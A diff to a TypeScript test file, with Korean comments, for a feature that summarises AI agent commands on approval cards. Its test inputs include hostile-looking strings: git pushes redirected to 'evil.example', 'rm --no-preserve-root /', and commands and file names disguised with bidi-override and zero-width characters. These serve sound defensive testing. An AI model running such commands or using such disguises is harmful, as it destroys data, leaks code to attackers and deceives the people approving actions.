@@ -1,7 +1,7 @@
 // 결재 카드 "결과 한 줄": 풀 수 있는 명령만 효과 문장, 애매하면 null(원문 유지) — npm test
 import assert from 'node:assert/strict'
 import { test } from 'node:test'
-import { approvalHeadline, effectOf } from '../src/shared/approvalEffect.ts'
+import { approvalHeadline, effectKeepsRawOpen, effectOf } from '../src/shared/approvalEffect.ts'
 import { LANGS, tr } from '../src/shared/i18n/index.ts'
 import { toPending, toRestoredApproval } from '../src/main/pendingApprovals.ts'
 import type { Approval } from '../src/shared/types.ts'
@@ -47,17 +47,20 @@ test('curl·wget: 호스트만, 보내기와 받기를 구분한다', () => {
   assert.deepEqual(bash('wget -q https://example.com/f.zip'), k('fetchGet', { host: 'example.com' }))
 })
 
-test('애매하면 null — 원문을 그대로 보인다', () => {
+test('애매하면 확실한 문장을 만들지 않는다 — null이거나 원문을 펼쳐 두는 unknown 줄', () => {
   for (const c of [
     '', 'rm', 'rm -rf', 'rm *.log', 'rm $X', 'rm $(ls)', 'rm `ls`', 'rm ~/x', 'rm {a,b}', 'rm a 2>/dev/null', 'rm -rf a &', '(rm a)', 'rm "$HOME/a"', 'rm --no-preserve-root /', 'rm -I a',
     'rm a; rm b', 'rm a && rm b', 'ls | xargs rm', 'cat > f', 'sudo rm a', 'env X=1 rm a', 'X=1 rm a', 'bash run.sh', './run.sh', 'sh -c "rm a"',
-    'git push', 'git push --delete origin x', 'git push origin :x', 'git push origin a:b', 'git push --tags origin', 'git push origin main extra', 'git commit -m x',
+    'git push', 'git push --delete origin x', 'git push origin :x', 'git push origin a:b', 'git push --tags origin', 'git push origin main extra', 'git commit --no-verify -m x',
     'curl notaurl', 'curl -o out.bin https://x.com/a', 'curl https://a.com https://b.com', 'curl -X PUTS https://a.com', 'curl -d', 'wget -O f https://x.com', 'curl https://x.com/?a=1',
     'frobnicate x', "rm 'unclosed",
     'git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main', 'git -c remote.origin.url=https://evil.example/r push origin main', 'git -C /other push origin main', 'git --git-dir=/x/.git push origin main',
-    'rm a\u202Egnp.txt', 'rm a\u200Bb', 'rm a\rb', 'git push origin ma\u202Ein', 'curl https://a.com\u0007',
-  ])
-    assert.equal(bash(c), null, c)
+  ]) {
+    const v = bash(c)
+    assert.ok(v === null || effectKeepsRawOpen(v), `${c} → ${v?.key}`)
+  }
+  // 안 보이는 글자는 아무 줄도 만들지 않는다
+  for (const c of ['rm a\u202Egnp.txt', 'rm a\u200Bb', 'rm a\rb', 'git push origin ma\u202Ein', 'curl https://a.com\u0007']) assert.equal(bash(c), null, c)
   for (const p of ['a\u202Etxt.exe', 'a\u200Bb', 'a\u0000b', 'a\rb', 'a\u001b[2Kb'])
     assert.equal(effectOf('Write', { file_path: p }), null, JSON.stringify(p))
   for (const tool of ['mcp__office-computer__computer', 'WebSearch', 'Task', 'AskUserQuestion', 'mcp__x__y']) assert.equal(effectOf(tool, { command: 'rm a', file_path: 'a', url: 'https://a.com' }), null, tool)
